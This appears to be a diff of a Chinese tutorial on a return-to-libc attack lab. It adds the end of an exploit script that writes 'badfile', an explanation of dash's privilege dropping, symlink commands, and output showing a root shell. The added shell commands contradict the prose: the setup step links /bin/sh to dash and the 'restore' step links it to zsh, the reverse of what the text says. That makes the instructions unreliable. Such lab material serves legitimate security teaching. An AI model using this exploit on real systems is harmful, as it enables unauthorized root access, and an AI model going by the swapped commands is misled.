@@ -1,4 +1,4 @@
-# Return to Libc 攻击之一
+# Return to Libc 攻击
 
 ## 一、引言
 
@@ -554,5 +554,25 @@ content[116:120] = (a1).to_bytes(4, byteorder='little')
 file = open("badfile", "wb")
 file.write(content)
 file.close()
+```
+
+前面提到，在虚拟机中，**`/bin/sh`** 实际上是一个指向 **`/bin/dash`** 的链接文件，它实现了一个保护机制: **当它发现自己在一个 Set-UID 的进程中运行时，会立刻把有效用户 ID 变成实际用户 ID，主动放弃特权，因此得不到 root shell**。为了达到实验的目的，需要我们使用一个没有实现该保护机制的 shell，即 zsh 的 shell 程序，只要把 **`/bin/sh`** 指向这个 shell 程序即可。命令如下：
+
+```shell{.line-numbers}
+# 让 /bin/sh 指向 /bin/dash
+monica@xvm:~/csapp/chapter3$ sudo ln -sf /bin/dash /bin/sh
+# 实验结束后恢复
+monica@xvm:~/csapp/chapter3$ sudo ln -sf /bin/zsh /bin/sh
+```
+
+在上述步骤完成之后，实验运行的结果如下所示，获取到了 root shell 权限。
+
+```c{.line-numbers}
+monica@xvm:~/csapp/chapter3$ ./stack
+Value:    /bin/sh
+Address:  ffffd3a9
+0xffffced4 ffffcf48
+system: 0xf7dc4cd0 exit: 0xf7db71f0
+# 
 ```
 
